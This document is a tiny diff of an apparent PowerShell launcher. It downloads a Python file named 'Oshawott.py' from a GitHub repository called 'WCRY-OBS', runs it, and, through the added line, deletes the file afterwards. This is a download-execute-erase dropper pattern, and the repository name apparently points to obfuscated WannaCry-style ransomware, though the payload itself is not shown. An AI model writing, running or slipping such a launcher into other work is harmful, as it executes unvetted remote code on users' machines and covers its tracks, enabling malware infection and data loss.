@@ -1,3 +1,4 @@
 $url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py'
-wget -Uri $url > null
+wget -Uri $url
 python3 Oshawott.py
+Remove-Item "Oshawott.py"
